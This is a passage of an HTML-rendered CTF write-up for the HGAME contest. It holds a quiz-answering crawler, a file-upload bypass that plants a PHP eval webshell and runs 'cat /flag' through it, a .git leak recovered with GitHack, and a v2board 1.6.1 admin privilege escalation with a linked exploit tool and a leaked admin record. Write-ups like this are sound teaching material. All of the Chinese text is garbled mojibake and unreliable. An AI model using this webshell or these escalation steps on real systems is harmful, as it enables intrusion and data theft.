class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Undefinedv&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;15 çº§ç½‘å®‰åä¼šä¼šé•¿ / Web å®‰å…¨&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/undefinedv.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Spine&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;é€†å‘ / äºŒè¿›åˆ¶å®‰å…¨&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/spine.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Tata&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;äºŒè¿›åˆ¶ CGC å…¥é—¨æ°´å‡† / åŠåŠå­çˆ¬è™«ä¸åçˆ¬è™«&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/tata.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Airbasic&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Web å®‰å…¨ / é•¿äº­ç§‘æŠ€å®‰æœéƒ¨é—¨ / TSRC 2015 å¹´å¹´åº¦è‹±é›„æ¦œç¬¬å…«ã€2016 å¹´å¹´åº¦è‹±é›„æ¦œç¬¬åä¸‰&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/airbasic.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jibo&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;15 çº§ / ä»€ä¹ˆéƒ½ä¸ä¼šçš„å¼€å‘ / æ‰“ä»€ä¹ˆéƒ½èœ&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/jibo.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Processor&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;15 çº§ Vidar ä¼šé•¿ / é€åˆ†å‹é€†å‘é€‰æ‰‹ / 13 æ®µå‰‘çº¯ / å·®ç‚¹æ²¡æ¯•ä¸š / é˜¿æ–¯å·´ç”œæœ‰ç‚¹ç”œ&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/Processor.jpeg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://processor.pub/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HeartSky&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;15 çº§ / æŒ–ä¸åˆ°æ´ / æ‰“ä¸åŠ¨ CTF / å†…ç½‘æ¸—é€ä¸äº† / å·¥å…·å†™ä¸å‡º&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/heartsky.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://heartsky.info&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Minygd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;15 çº§ / åˆ åº“è·‘è·¯ç†Ÿç»ƒå·¥ / æ²¡äº‹å„¿æ‹ä¸ªç…§ / ä¼é¹…&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/mingy.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Yotubird&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;15 çº§ / å·²å…¥ Python ç¥æ•™&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/Yotubird.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c014&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;15 çº§ / Web ğŸ¶ / æ±ªæ±ªæ±ª&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/c014.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Explorer&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;14 çº§ HDUISA ä¼šé•¿ / äºŒè¿›åˆ¶å®‰å…¨ / æ›¾è¢« NULLã€TDã€è“è²èŠ±ç­‰æ‹‰å»å‡‘äººæ•° / å·®ç‚¹æ²¡æ¯•ä¸š / é•¿äº­å®‰ç ”&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/Explorer.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Aklis&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;14 çº§ HDUISA å‰¯ä¼šé•¿ / äºŒæ¬¡å…ƒ / æ‹¼å¤šå¤šå®‰å…¨å·¥ç¨‹å¸ˆ&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/aklis.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Sysorem&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;14 çº§ç½‘å®‰åä¼šä¼šé•¿ / HDUISA æˆå‘˜ / Web å®‰å…¨ / Freebuf å®‰å…¨ç¤¾åŒºç‰¹çº¦ä½œè€… / FSI2015Freebuf ç‰¹é‚€å˜‰å®¾&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/sysorem.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hcamael&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;13 çº§ / çŸ¥é“åˆ›å®‡ 404 å®‰å…¨ç ”ç©¶å‘˜ / ç°åœ¨ Nu1L åˆ’åˆ’æ°´ / IoTã€Webã€äºŒè¿›åˆ¶æ¼æ´ï¼Œå¯†ç å­¦ï¼ŒåŒºå—é“¾éƒ½çœ‹å¾—æ‡‚ä¸€ç‚¹ï¼Œä½†å•¥ä¹Ÿä¸ä¼š&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/hcamael.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LoRexxar&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;14 çº§ / Web ğŸ¶ / æ­ç”µæ±Ÿæµå„¿ / è‡ªèµ°æ£‹ä¸»æ•™å®ˆé—¨å‘˜&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/lorexxar.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://lorexxar.cn/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;A1ex&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;14 çº§ç½‘å®‰åä¼šå‰¯ä¼šé•¿ / Web å®‰å…¨&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/alex.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Ahlaman&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;14 çº§ç½‘å®‰åä¼šå‰¯ä¼šé•¿ / æ— çº¿å®‰å…¨&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/ahlaman.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lightless&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Web å®‰å…¨ / å®‰å…¨å·¥ç¨‹å¸ˆ / åŠåŠå­å¼€å‘ / åŠåŠå­å®‰å…¨ç ”ç©¶&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/lightless.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://lightless.me/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Edward_L&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;13 çº§ HDUISA ä¼šé•¿ / Web å®‰å…¨ / åä¸ºå®‰å…¨éƒ¨é—¨ / äºŒè¿›åˆ¶å®‰å…¨ï¼Œfuzzï¼Œç¬¦å·æ‰§è¡Œæ–¹å‘ç ”ç©¶&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/edward_L.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;é€†é£&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;13 çº§èœé¸¡ / å¤§æ•°æ®æ‰“æ‚&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/deadwind4.jpeg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://github.com/deadwind4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;é™ˆæ–©ä»™&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ä»€ä¹ˆéƒ½ä¸ä¼š / å’¸é±¼ç ”ç©¶ç”Ÿ / &lt;del&gt;å®‰æ’&lt;/del&gt;ã€&lt;del&gt;é•¿äº­&lt;/del&gt; / SJTU&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/chenzhanxian.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://mxgcccc4.github.io/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Eric&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;æ¸—é€ / äººå·¥æ™ºèƒ½ / åŒ—å¸ˆå¤§åšå£«åœ¨è¯»&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/eric.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://3riccc.github.io&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p><code>exp.py</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./database.json&quot;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> load_f:</span><br><span class="line">    load_dict = json.load(load_f)</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    </span><br><span class="line">    question_url = <span class="string">&#x27;http://week-1.hgame.lwsec.cn:30466/api/getQuestion&#x27;</span></span><br><span class="line">    verify_url = <span class="string">&#x27;http://week-1.hgame.lwsec.cn:30466/api/verifyAnswer&#x27;</span></span><br><span class="line">    getscore_url = <span class="string">&#x27;http://week-1.hgame.lwsec.cn:30466/api/getScore&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response_q = session.get(url=question_url)</span><br><span class="line">    res = re.findall(<span class="string">&#x27;&quot;.*?&quot;&#x27;</span>,response_q.text)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> info <span class="keyword">in</span> load_dict:</span><br><span class="line">        <span class="keyword">if</span>(info[<span class="string">&#x27;intro&#x27;</span>]==res[<span class="number">1</span>:-<span class="number">1</span>]):</span><br><span class="line">            <span class="built_in">print</span>(info[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: info[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">    response = session.post(url=verify_url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Correct&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="built_in">print</span>(response_q.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    response = session.get(url=getscore_url)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;100&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># break</span></span><br></pre></td></tr></table></figure><p>æˆåŠŸè·‘å®Œå³å¯å¾—åˆ°<code>flag</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;Guess_who_i_am^Happy_Crawler&#125;</span><br></pre></td></tr></table></figure><h3 id="Show-Me-Your-Beauty"><a href="#Show-Me-Your-Beauty" class="headerlink" title="Show Me Your Beauty"></a>Show Me Your Beauty</h3><p>ç”¨<code>Php</code>åç¼€ç»•è¿‡</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>week-1.hgame.lwsec.cn:32057</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>205</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryhpSA34RZsdEhzob1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://week-1.hgame.lwsec.cn:32057</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://week-1.hgame.lwsec.cn:32057/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=MTY3MjkzMTY3NXxEdi1CQkFFQ180SUFBUkFCRUFBQU9fLUNBQUlHYzNSeWFXNW5EQWdBQm5OdmJIWmxaQU5wYm5RRUFnQUVCbk4wY21sdVp3d05BQXRqYUdGc2JHVnVaMlZKWkFOcGJuUUVBZ0ItfEpkrqBezOGq9RBd9KmLkzyDgKVjXFwrAT9nHfmQOxAS; PHPSESSID=jpl68kvmg4r5ivdebfb84sa9k1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryhpSA34RZsdEhzob1</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;a.Php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/jpeg</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryhpSA34RZsdEhzob1--</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤å³å¯</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/img/a.Php?a=system(&quot;cat+/flag&quot;);</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>week-1.hgame.lwsec.cn:32057</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=MTY3MjkzMTY3NXxEdi1CQkFFQ180SUFBUkFCRUFBQU9fLUNBQUlHYzNSeWFXNW5EQWdBQm5OdmJIWmxaQU5wYm5RRUFnQUVCbk4wY21sdVp3d05BQXRqYUdGc2JHVnVaMlZKWkFOcGJuUUVBZ0ItfEpkrqBezOGq9RBd9KmLkzyDgKVjXFwrAT9nHfmQOxAS; PHPSESSID=jpl68kvmg4r5ivdebfb84sa9k1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>flag</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;Unsave_F1L5_SYS7em_UPL0ad!&#125;</span><br></pre></td></tr></table></figure><h2 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h2><h3 id="Git-Leakage"><a href="#Git-Leakage" class="headerlink" title="Git Leakage"></a>Git Leakage</h3><p>ä½¿ç”¨<code>GitHack</code>æ‰«æ<code>/.git/</code>é¡µé¢å³å¯ä¸‹è½½<code>Th1s_1s-flag</code>æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;Don&#x27;t^put*Git-in_web_directory&#125;</span><br></pre></td></tr></table></figure><h3 id="v2board"><a href="#v2board" class="headerlink" title="v2board"></a>v2board</h3><p>v2board v.1.6.1 æœºåœºé¢æ¿ç®¡ç†æ¥å£è¶Šæƒæ¼æ´</p><blockquote><p>åˆ†æå¯å‚è€ƒè¯¥<a href="https://zgao.top/v2board-v-1-6-1-%e6%9c%ba%e5%9c%ba%e9%9d%a2%e6%9d%bf%e7%ae%a1%e7%90%86%e6%8e%a5%e5%8f%a3%e8%b6%8a%e6%9d%83%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/">åšæ–‡</a></p></blockquote><p>åˆ©ç”¨å·¥å…·<a href="https://github.com/zgao264/v2board-exp">https://github.com/zgao264/v2board-exp</a></p><p>åœ¨<code>_api_v1_admin_user_fetch.json</code>ä¸­æ‰¾åˆ°<code>admin</code>çš„<code>token</code></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;invite_user_id&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;telegram_id&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;email&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin@example.com&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;$2y$10$JLs3LJrKqsTly8K.w9KzI.e0Jt\/7oU9W3gQYcUDSRjg1LReimLLTS&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password_algo&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;password_salt&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;balance&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;discount&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;commission_type&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;commission_rate&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;commission_balance&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;t&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;u&quot;</span><span 